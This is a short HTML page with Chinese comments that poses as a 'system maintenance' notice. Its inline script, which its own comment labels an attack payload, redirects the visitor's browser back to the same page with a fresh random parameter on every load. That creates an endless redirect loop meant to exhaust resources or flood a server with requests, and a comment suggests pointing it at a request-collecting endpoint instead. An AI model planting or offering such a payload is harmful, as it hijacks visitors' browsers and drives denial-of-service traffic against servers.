<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>系统更新中</title>
<script>
  // 攻击负载：每次页面加载时生成一个随机参数，并立即重定向到当前页面（或指定端点），形成无限重定向循环
  (function() {
    // 生成唯一随机参数，确保每次 URL 都不同
    const randomToken = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
    // 重定向到当前页面本身，附带随机参数
    const currentUrl = new URL(window.location.href);
    // 清除旧的随机参数（如果有），然后设置新的
    currentUrl.searchParams.set('r', randomToken);
    // 可选：也可以跳转到另一个专门收集请求的端点，这里以自身为例
    window.location.replace(currentUrl.toString());
  })();
</script>
</head>
<body>
<!-- 如果 JS 未执行，则显示静态提示（此时消耗已失效） -->
<h1>系统维护中</h1>
<p>页面正在加载，请稍候... 如果您未自动跳转，请点击<a href="./?r=fallback">此处</a>。</p>
</body>
</html>
